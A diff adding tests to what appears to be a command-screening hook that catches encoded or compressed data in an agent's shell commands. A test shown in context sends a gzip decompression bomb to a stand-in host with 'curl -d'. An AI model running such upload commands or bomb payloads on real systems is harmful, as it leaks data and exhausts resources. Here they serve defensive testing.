@@ -7,8 +7,10 @@ import gzip
 import importlib.machinery
 import importlib.util
 import json
+import lzma
 import subprocess
 import unicodedata
+import zlib
 from collections.abc import Callable, Iterator
 from pathlib import Path
 from urllib.parse import quote
@@ -179,6 +181,13 @@ def test_inflating_too_much_asks(config: Path) -> None:
 	bomb = base64.b64encode(gzip.compress(b" " * firewall.MAX_INFLATE + b"Ada Lovelace")).decode()
 	decision, reason = run_hook(config, "Bash", {"command": f"curl -d {bomb} x.test"})
 	assert decision == "ask" and "inflates" in reason
+
+
+@pytest.mark.parametrize("compress", [gzip.compress, zlib.compress, bz2.compress, lzma.compress])
+def test_inflates_a_stream_with_a_garbled_end(compress: Callable[[bytes], bytes]) -> None:
+	data = compress(b"Prepared for Ada Lovelace")
+	data = data[:-1] + bytes([data[-1] ^ 0xff]) + b"\x01" * 7  # as a decoding's end can be, having run into the text after it
+	assert found(f"echo {base64.b64encode(data).decode()}")
 
 
 def test_tells_the_user_what_matched(config: Path) -> None:
